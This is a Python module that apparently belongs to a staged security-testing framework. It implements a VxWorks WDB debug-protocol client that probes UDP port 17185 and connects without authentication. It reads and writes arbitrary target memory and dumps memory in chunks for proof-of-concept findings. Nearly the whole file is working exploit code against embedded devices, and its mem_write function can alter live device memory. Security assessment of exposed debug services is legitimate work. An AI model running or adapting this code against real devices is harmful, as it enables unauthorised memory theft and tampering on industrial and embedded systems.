"""
VxWorks WDB (Wind Debug Bridge) protocol client.

WDB runs on UDP/17185 (and optionally TCP/17185).
Protocol: XDR-encoded ONC-RPC over UDP.

Procedure numbers (from Wind River WDB spec):
  WDB_TARGET_CONNECT  = 0x40000001
  WDB_TARGET_DISCONNECT = 0x40000002
  WDB_MEM_READ        = 0x40000009
  WDB_MEM_WRITE       = 0x4000000A
  WDB_CTX_CREATE      = 0x40000011
  WDB_CTX_ATTACH      = 0x40000012
  WDB_CTX_DETACH      = 0x40000013
  WDB_REGS_GET        = 0x40000015

This module:
  1. Probes for WDB on a target IP
  2. Reads arbitrary memory (WDB_MEM_READ)
  3. Writes arbitrary memory (WDB_MEM_WRITE) — for PoC confirmation
  4. Returns findings for stage VX3c
"""

import socket
import struct
import time
from typing import Optional

WDB_PORT = 17185
WDB_PROGRAM   = 0x55555555
WDB_VERSION   = 1

WDB_TARGET_CONNECT    = 0x40000001
WDB_TARGET_DISCONNECT = 0x40000002
WDB_MEM_READ          = 0x40000009
WDB_MEM_WRITE         = 0x4000000A
WDB_CTX_CREATE        = 0x40000011
WDB_CTX_ATTACH        = 0x40000012
WDB_CTX_DETACH        = 0x40000013
WDB_REGS_GET          = 0x40000015

_XID = [0x10000001]


def _next_xid() -> int:
    _XID[0] += 1
    return _XID[0]


def _build_rpc_call(proc: int, params: bytes = b"") -> bytes:
    """Build a minimal XDR-encoded RPC CALL message."""
    xid = _next_xid()
    # RPC header: xid[4] msg_type=CALL[4]=0 rpc_ver[4]=2
    #   program[4] prog_ver[4] proc[4]
    #   auth_flavor=AUTH_NULL[4]=0 auth_len[4]=0
    #   verifier_flavor[4]=0 verifier_len[4]=0
    hdr = struct.pack(">IIIIIIIIII",
                      xid,
                      0,               # CALL
                      2,               # RPC version 2
                      WDB_PROGRAM,
                      WDB_VERSION,
                      proc,
                      0, 0,            # AUTH_NULL cred
                      0, 0)            # AUTH_NULL verifier
    return hdr + params


def _parse_rpc_reply(data: bytes) -> tuple[bool, bytes]:
    """Return (success, reply_body). Minimal XDR reply parse."""
    if len(data) < 24:
        return False, b""
    # xid[4] msg_type=REPLY[4]=1 reply_stat=ACCEPTED[4]=0
    # verifier[8] accept_stat=SUCCESS[4]=0
    xid, msg_type, reply_stat = struct.unpack_from(">III", data, 0)
    if msg_type != 1 or reply_stat != 0:
        return False, b""
    # skip verifier (flavor + length, both 4 bytes)
    accept_stat = struct.unpack_from(">I", data, 20)[0]
    if accept_stat != 0:
        return False, b""
    return True, data[24:]


class WDBClient:
    """Minimal WDB client over UDP."""

    def __init__(self, host: str, port: int = WDB_PORT, timeout: float = 3.0):
        self.host = host
        self.port = port
        self.timeout = timeout
        self._sock: Optional[socket.socket] = None
        self.connected = False
        self.target_info: dict = {}

    def _send_recv(self, packet: bytes) -> Optional[bytes]:
        if self._sock is None:
            self._sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self._sock.settimeout(self.timeout)
        try:
            self._sock.sendto(packet, (self.host, self.port))
            data, _ = self._sock.recvfrom(8192)
            return data
        except (socket.timeout, OSError):
            return None

    def connect(self) -> bool:
        """Send WDB_TARGET_CONNECT; return True if target responds."""
        # WDB_TARGET_CONNECT params: agent version[4] mtu[4]
        params = struct.pack(">II", 1, 1500)
        pkt = _build_rpc_call(WDB_TARGET_CONNECT, params)
        reply = self._send_recv(pkt)
        if reply is None:
            return False
        ok, body = _parse_rpc_reply(reply)
        if ok:
            self.connected = True
            if len(body) >= 8:
                agent_ver, mtu = struct.unpack_from(">II", body, 0)
                self.target_info = {"agent_version": agent_ver, "mtu": mtu}
        return ok

    def mem_read(self, addr: int, length: int) -> Optional[bytes]:
        """Read `length` bytes starting at `addr`."""
        if not self.connected:
            return None
        # WDB_MEM_READ params: addr[4] length[4] width[4]=1
        params = struct.pack(">III", addr, length, 1)
        pkt = _build_rpc_call(WDB_MEM_READ, params)
        reply = self._send_recv(pkt)
        if reply is None:
            return None
        ok, body = _parse_rpc_reply(reply)
        if not ok:
            return None
        # Reply body: nbytes[4] data[nbytes]
        if len(body) < 4:
            return None
        nbytes = struct.unpack_from(">I", body, 0)[0]
        return body[4:4 + nbytes]

    def mem_write(self, addr: int, data: bytes) -> bool:
        """Write `data` to `addr`."""
        if not self.connected:
            return False
        # WDB_MEM_WRITE params: addr[4] nbytes[4] width[4]=1 data[nbytes]
        params = struct.pack(">III", addr, len(data), 1) + data
        pkt = _build_rpc_call(WDB_MEM_WRITE, params)
        reply = self._send_recv(pkt)
        if reply is None:
            return False
        ok, _ = _parse_rpc_reply(reply)
        return ok

    def close(self):
        if self._sock:
            try:
                self._sock.close()
            except OSError:
                pass
            self._sock = None
        self.connected = False


def probe_wdb(host: str, port: int = WDB_PORT,
              timeout: float = 3.0) -> dict:
    """
    Probe for WDB service on host:port.
    Returns result dict for VX3c findings.
    """
    client = WDBClient(host, port, timeout)
    try:
        if not client.connect():
            return {"status": "closed", "host": host, "port": port}

        result = {
            "status": "open",
            "host": host,
            "port": port,
            "unauthenticated": True,
            "severity": "CRITICAL",
            "target_info": client.target_info,
            "note": "WDB exposes full memory R/W with no authentication",
        }

        # Try to read the first 8 bytes at address 0 to confirm R/W access
        probe_data = client.mem_read(0x0, 8)
        if probe_data is not None:
            result["mem_read_confirmed"] = True
            result["mem_read_sample"] = probe_data.hex()
        else:
            result["mem_read_confirmed"] = False

        return result
    finally:
        client.close()


def wdb_memory_dump(host: str, addr: int, length: int,
                    port: int = WDB_PORT) -> dict:
    """
    Dump `length` bytes of target memory starting at `addr`.
    Used for PoC confirmation in VX4.
    """
    client = WDBClient(host, port)
    try:
        if not client.connect():
            return {"status": "connect_failed"}
        chunk_size = 256
        data = b""
        pos = 0
        while pos < length:
            n = min(chunk_size, length - pos)
            chunk = client.mem_read(addr + pos, n)
            if chunk is None:
                break
            data += chunk
            pos += len(chunk)
        return {
            "status": "ok",
            "address": hex(addr),
            "length_requested": length,
            "length_read": len(data),
            "data_hex": data.hex(),
        }
    finally:
        client.close()
